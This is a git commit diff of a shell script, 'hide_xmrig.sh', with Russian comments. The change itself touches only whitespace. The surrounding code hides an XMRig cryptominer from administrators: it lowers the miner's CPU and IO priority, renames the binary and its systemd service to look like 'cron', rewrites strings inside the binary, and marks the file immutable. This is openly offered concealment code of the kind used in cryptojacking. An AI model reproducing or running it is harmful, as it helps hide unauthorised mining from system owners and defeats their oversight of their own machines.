ea5cd6f9548650d939d1f41d5b57e93ee60ef9e0
Syndicate <100962424+Bravno@users.noreply.github.com>
2024-08-13 16:46:47 +0300

    Update hide_xmrig.sh

--- hide_xmrig.sh
+++ hide_xmrig.sh
@@ -13,33 +13,33 @@ XMRIG_SERVICE="/etc/systemd/system/xmrig.service"
 # Функция для сокрытия нагрузки
 hide_load() {
     echo -e "${BLUE}Сокрытие нагрузки процессора...${NC}"
-
+    
     # Снижение приоритета CPU и изменение IO
     ionice -c3 -p "$(pgrep xmrig)"  # Снижение приоритета IO
     renice -n 19 -p "$(pgrep xmrig)"  # Снижение приоритета процесса
-
+    
     # Изменение имени процесса
     sed -i 's/xmrig/cron/g' "$XMRIG_PATH/build/xmrig"
     systemctl daemon-reload
     systemctl restart xmrig.service
-
+    
     echo -e "${GREEN}Процесс скрыт!${NC}"
 }
 
 # Функция для сокрытия файла и сервиса
 hide_files() {
     echo -e "${BLUE}Сокрытие файлов...${NC}"
-
+    
     # Изменение прав доступа и имени
     chattr +i "$XMRIG_PATH/build/xmrig"
     mv "$XMRIG_PATH/build/xmrig" "$XMRIG_PATH/build/cron"
-
+    
     # Изменение имени сервиса
     mv "$XMRIG_SERVICE" "/etc/systemd/system/cron-xmrig.service"
     sed -i 's/xmrig/cron/g' "/etc/systemd/system/cron-xmrig.service"
     systemctl daemon-reload
     systemctl restart cron-xmrig.service
-
+    
     echo -e "${GREEN}Файлы скрыты!${NC}"
 }
 
